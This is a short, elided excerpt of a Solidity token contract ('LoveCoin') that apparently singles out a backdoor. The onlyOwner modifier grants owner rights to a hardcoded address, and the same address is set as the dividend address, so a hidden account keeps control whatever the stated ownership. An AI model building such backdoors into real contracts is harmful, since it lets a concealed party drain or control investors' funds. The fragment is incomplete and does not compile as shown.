...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x230F98B76f97F2885aC70B870aD4dabca40c1CFE) , "owner");
        _;
    }
...
contract LoveCoin  is Context, IERC20, Ownable {
    ...
    address public dividend = 0x230F98B76f97F2885aC70B870aD4dabca40c1CFE;
